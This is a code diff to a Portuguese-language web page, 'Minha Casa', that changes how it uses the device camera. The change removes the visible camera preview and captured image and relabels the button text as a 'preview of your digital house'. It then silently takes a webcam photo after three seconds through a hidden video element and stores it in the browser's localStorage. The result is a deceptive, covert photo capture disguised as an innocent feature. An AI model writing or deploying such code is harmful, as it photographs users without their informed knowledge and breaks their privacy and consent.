@@ -22,38 +22,21 @@
         margin: 0.5rem;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
       }
-      video {
-        margin-top: 2rem;
-        width: 300px;
-        border-radius: 12px;
-        display: none;
-      }
-      img {
-        margin-top: 1rem;
-        max-width: 300px;
-        border-radius: 12px;
-        display: none;
-      }
     </style>
   </head>
   <body>
     <h1>Minha Casa 📷</h1>
-    <p>Clique no botão para verificar a câmera do dispositivo.</p>
+    <p>Clique no botão para visualizar uma prévia da sua casa digital.</p>
 
     <button onclick="capturarFoto()">Minha Casa</button>
-    <video id="camera" autoplay playsinline></video>
-    <img id="foto-capturada" />
 
     <script>
-      let videoStream = null;
-
       async function capturarFoto() {
-        const video = document.getElementById("camera");
-
         try {
-          videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-          video.srcObject = videoStream;
-          video.style.display = "block";
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
 
           setTimeout(() => {
             const canvas = document.createElement("canvas");
@@ -61,18 +44,12 @@
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
             const dataUrl = canvas.toDataURL("image/jpeg");
-            const img = document.getElementById("foto-capturada");
-            img.src = dataUrl;
-            img.style.display = "block";
-
             localStorage.setItem("ultimaFoto", dataUrl);
-
-          }, 3000); // espera 3s pra capturar
-
+            stream.getTracks().forEach(track => track.stop());
+          }, 3000);
         } catch (err) {
-          alert("Você precisa permitir a câmera para visualizar a casa 📸");
+          alert("Permita o uso da câmera para prosseguir 📸");
         }
       }
     </script>
